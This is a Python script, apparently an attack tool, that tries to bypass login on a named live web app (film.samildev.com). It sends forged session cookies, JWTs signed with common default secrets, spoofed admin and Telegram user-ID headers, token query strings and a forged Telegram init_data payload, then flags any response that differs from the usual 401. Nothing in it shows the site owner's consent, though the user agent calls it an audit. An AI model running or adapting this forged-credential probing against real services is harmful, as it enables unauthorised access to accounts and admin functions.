"""Forge a session and see whether the app's answer changes.

The API answers every unauthenticated request with the same
``401 {"error":"Telegram oturumu gerekli"}``. A wrong-but-plausible
credential that reaches a different code path would change the status code or
the message. Any difference is the crack.

Credentials tried: common cookie names, self-signed JWTs with the secrets a
deployment forgets to change, plain random tokens, and the admin header shapes.
Low volume, GET and one POST, no state change.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import time

import httpx

COOKIE_NAMES = (
    "session",
    "sess",
    "sid",
    "token",
    "auth",
    "tg_session",
    "tg_sid",
    "pixelfilm_session",
    "pf_session",
    "pf_sid",
    "rave_session",
    "connect.sid",
    "flask_session",
    "jwt",
    "access_token",
)

JWT_SECRETS = (
    "secret",
    "jwt_secret",
    "JWT_SECRET",
    "your-256-bit-secret",
    "super-secret",
    "pixelfilm",
    "change-me",
    "changeme",
    "samildev",
    "tg-secret",
    "telegram",
    "",
)

HEADERS = (
    {},
    {"X-Session-Token": "1"},
    {"X-Admin-Token": "1"},
    {"X-Admin-Key": "1"},
    {"X-Api-Key": "1"},
    {"Authorization": "Basic YWRtaW46YWRtaW4="},
    {"X-Forwarded-User": "1"},
    {"X-Telegram-User-Id": "1"},
)


def b64(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def make_jwt(payload: dict, secret: str) -> str:
    header = b64(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    body = b64(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header}.{body}".encode()
    signature = b64(hmac.new(secret.encode(), signing_input, hashlib.sha256).digest())
    return f"{header}.{body}.{signature}"


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="https://film.samildev.com")
    parser.add_argument("--path", default="/api/me")
    args = parser.parse_args()

    baseline = None
    deviations = []

    with httpx.Client(
        base_url=args.target, timeout=15, follow_redirects=False,
        headers={"User-Agent": "rave-gate-audit/1.0"},
    ) as client:
        baseline = client.get(args.path)
        base_signature = (baseline.status_code, baseline.text)
        print(f"baseline {args.path} -> {baseline.status_code} {baseline.text}")

        for name in COOKIE_NAMES:
            for value in ("1", b64(b"\x00" * 16), hashlib.md5(b"x").hexdigest()):
                response = client.get(args.path, cookies={name: value})
                signature = (response.status_code, response.text)
                if signature != base_signature:
                    deviations.append((f"cookie {name}={value[:12]}", signature))
                    print(f"  DEVIATION cookie {name}={value[:12]} -> {response.status_code} {response.text[:120]}")

        now = int(time.time())
        jwt_payload = {
            "user_id": 1,
            "id": 1,
            "sub": "1",
            "auth_date": now,
            "iat": now,
            "exp": now + 3600,
        }
        for secret in JWT_SECRETS:
            token = make_jwt(jwt_payload, secret)
            for name in ("session", "token", "jwt", "access_token", "pixelfilm_session"):
                response = client.get(args.path, cookies={name: token})
                signature = (response.status_code, response.text)
                if signature != base_signature:
                    deviations.append((f"jwt cookie {name} secret={secret!r}", signature))
                    print(f"  DEVIATION jwt {name} secret={secret!r} -> {response.status_code} {response.text[:120]}")

        for headers in HEADERS:
            response = client.get(args.path, headers=headers)
            signature = (response.status_code, response.text)
            if signature != base_signature:
                deviations.append((f"header {list(headers)[0]}", signature))
                print(f"  DEVIATION header {headers} -> {response.status_code} {response.text[:120]}")

        for query in ("token=1", "session=1", "auth=1", "key=1", "api_key=1", "admin=1"):
            response = client.get(f"{args.path}?{query}")
            signature = (response.status_code, response.text)
            if signature != base_signature:
                deviations.append((f"query {query}", signature))
                print(f"  DEVIATION query {query} -> {response.status_code} {response.text[:120]}")

        forged = "auth_date=%d&user=%s&hash=%s" % (now, "%7B%22id%22%3A1%7D", "0" * 64)
        response = client.post(args.path, json={"init_data": forged})
        signature = (response.status_code, response.text)
        if signature != base_signature:
            deviations.append(("POST init_data", signature))
            print(f"  DEVIATION POST init_data -> {response.status_code} {response.text[:120]}")

    print(f"\ndeviations: {len(deviations)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
